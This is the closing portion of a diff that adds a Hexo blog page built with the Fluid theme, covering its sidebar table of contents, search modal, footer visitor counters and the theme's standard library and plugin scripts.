+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <style>.statistics { display: none !important; }</style>
+<a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+<br>
+<script async src="//cdn.busuanzi.cc/busuanzi/3.6.9/busuanzi.min.js"></script>
+<span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_site_pv" style="color:red">...</span> 次 </span> &nbsp; | &nbsp; <span id="busuanzi_container_site_uv"> 总访客数 <span id="busuanzi_site_uv" style="color:red">...</span> 人 </span> 
+    </div>
+  
+  
+  
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/random-slogan.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
